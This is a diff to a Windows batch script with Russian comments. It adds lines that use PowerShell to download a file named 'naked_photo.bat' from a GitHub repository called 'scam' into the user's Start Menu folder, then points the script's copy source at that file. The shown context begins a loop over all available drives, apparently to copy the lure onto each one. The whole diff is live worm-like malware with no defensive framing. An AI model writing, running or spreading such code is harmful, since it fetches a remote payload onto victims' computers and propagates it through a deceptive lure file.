@@ -1,8 +1,13 @@
 @echo off
 setlocal enabledelayedexpansion
 
+set "file_path=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\naked_photo.bat"
+set "github_url=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/naked_photo.bat"
+
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%github_url%', '%file_path%')"
+
 :: Укажите путь к файлу, который нужно скопировать
-set "source_file=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Updater_Edge.bat"
+set "source_file=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\naked_photo.bat"
 
 :loop
     :: Цикл по всем доступным дискам
